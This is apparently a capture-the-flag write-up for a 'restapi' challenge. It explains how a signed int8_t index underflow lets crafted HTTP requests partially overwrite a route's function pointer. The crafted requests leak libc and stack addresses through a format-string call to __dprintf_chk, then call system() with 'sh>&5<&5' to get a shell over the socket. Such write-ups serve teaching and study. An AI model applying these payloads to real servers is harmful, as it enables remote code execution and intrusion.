# restapi

The bug is in `split_path_segments`, where a signed `int8_t` is used as an index of a 256-element heap array.


The heap layout at start is:

```
+----------+
| buf      | <-----------------------------------------------------
+----------+ <                                                     |
| route    | <                                                     |
+----------+ <                                                     |
| route    | <                                                     |
+----------+ <                                                     |
| route    | <                                                     |
+----------+                                                       |
| segs     |  - underflow from segs reaches partway back into buf -
+----------+

```

This lets us write at offsets preceeding the segment array. The written data consists of pointers into the input buffer &buf[offset], and segment lengths.

There's plausibly some house-of-whatever you can do by overwriting heap metadata (fingers crossed I have prevented this), but the intended solution is to partially overwrite a route definition, like so:

```
struct path_segment {                       struct route {
    char *segment;    ... full overwrite ...... char *path;
    uint16_t length;  ... partial overwrite ... void *func;
};                    ... left unchanged ...... struct route *next;
                                            };
```

ASLR has 4096-byte granularity, so a 16-bit partial overwrite of a function pointer has a 1/16 chance of success.

The 16-bit value comes from the length of the path segment, so to corrupt the first route, we send something like this:

```
GET ///////////////...///////////////AAAAAAAAAAAAAAA...AAAAAAAAAAAAAAAA HTTP/1.1\n

               251 slashes                 (function % 0x10000) As   
```

When this corrupted route is being matched, the `path` pointer points into the same place in the buffer as where our `A`s were on the first request.

Thus in our second request, if we want the route to be matched, we must provide the route template at that same offset, ensuring null-termination by placing it at the end of the request:

```
GET /meow/123 HTTP/1.1\n                            /meow/$num

    ^                    ^                          ^
    |                    |                          |
    |                    |                          template which matches our url
    |                    padding equiv. to 251 slashes
    the url we access

```

This lets us call any local function (in the same 0x10000-byte area as a request handler) with controlled int and string arguments. For example, we can call `_dprintf_chk` from the PLT, and leak stack contents!

```
GET /4/0/%lu_%lu_%lu_%lu  HTTP/1.1\n                /$num/$num/$string

     ^ ^ ^                                           ^
     | | |                                           |
     | | format string                               template which matches our url
     | _chk flags=0 (no overflow check)
     fd=4
```

4 is the socket's fd, 0 is the `__dprintf_chk` flags argument requesting no overflow checks, and the 3rd argument is our format string!

This can be used to leak libc and stack pointers from the stack.

What if we want to call a function from elsewhere, like from libc? This can be accomplished by redoing the partial overwrite to target `call_func_with_args`, and supplying an arbitrary function pointer as the first argument. We use the stack leak to place additional arguments later on in the `args` array:

```
args[0]               ...1               ...2 3
     |                   |                  | |
     v                   v                  v v

GET /{libc_base+0x4e9f0}/{stack_leak-0x1b0}/1/sh>&5<&5 /$num/$num/$num/$string

     ^                   ^                  ^ ^
     |                   |                  | |
     |                   |                  | unused parameter = our shell command
     |                   |                  | 
     func = system       args = &args[3]    argc = 1
```

Note that earlier we used fd 4 for dprintf, and now we use fd 5 in our `system` call - this is because the connection socket was never closed after our earlier `dprintf` invocation, leaking an fd.

